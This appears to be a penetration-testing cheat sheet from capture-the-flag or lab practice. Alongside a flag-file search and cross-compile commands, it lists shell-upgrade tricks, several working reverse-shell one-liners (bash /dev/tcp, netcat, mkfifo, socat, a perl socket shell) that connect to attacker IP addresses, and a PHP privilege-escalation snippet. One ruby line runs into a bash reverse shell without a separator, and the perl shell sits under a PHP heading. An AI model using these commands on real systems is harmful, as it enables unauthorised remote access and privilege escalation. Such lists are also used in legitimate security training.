##### **Search For file by name or extension**
Find a file in entire system.
```
find / -type f -name "flag.txt" 2>/dev/null
```

##### **Binary conversion using GO**
Converting binaries into any format Using GO, First navigate  to the source file and execute the command.
```
GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

##### **Convert c to exe binary**
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

##### **Fully Interactive Shell**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
stty raw -echo ; fg
```
```
perl -e 'exec "/bin/bash";'
```
```
ruby -e 'exec "/bin/bash";'bash -c 'bash -i >& /dev/tcp/192.168.45.240/4444 0>&1'
```
```
/bin/bash -ip
```

##### **Linux Reverse Shell One Liner**
Basic One liners.
```
bash -c 'bash -i >& /dev/tcp/192.168.45.242/443 0>&1'
```
```
nc -e /bin/bash 192.168.45.226 4444
```
```
mkfifo /tmp/f; nc 192.168.45.243 1234 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
```
```
bash -i >& /dev/tcp/192.168.45.229/22 0>&1
```
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.233:4444
```

If PHP has SUID or root privilege, can use for Privilege Escalation
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.240:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
-r "pcntl_exec('/bin/sh', ['-p']);"
```